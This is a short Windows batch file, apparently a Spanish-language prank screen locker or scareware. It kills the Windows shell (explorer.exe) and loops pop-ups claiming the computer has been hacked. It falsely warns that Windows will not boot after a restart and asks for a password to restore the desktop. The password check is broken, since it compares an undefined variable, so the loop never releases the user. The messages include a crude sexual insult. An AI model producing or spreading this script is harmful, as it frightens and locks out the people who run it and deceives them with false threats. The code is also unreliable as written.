color 0A
@echo off
title Anonymuss.FYB
taskkill /f /im explorer.exe
:bucle
cls
msg * Lee con atención,  No reinicie el computador
msg * Este mensaje solo lo pueden leer a los que le gusta el p**e (contrasena:HolaPapu)
msg * Haz sido hackeado
msg * ELPEPE
echo ========================================================================
echo Si usted cierra esta ventana,  no podra colocar la contrasena.
echo Si apaga/reinicia el computador, el "Windows" no iniciara correctamente.
echo ========================================================================
set /p pass=Pon la contraseña para desbloquear el computador:
if Y%passY%==HolaPapu (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades!
start explorer.exe
pause
exit
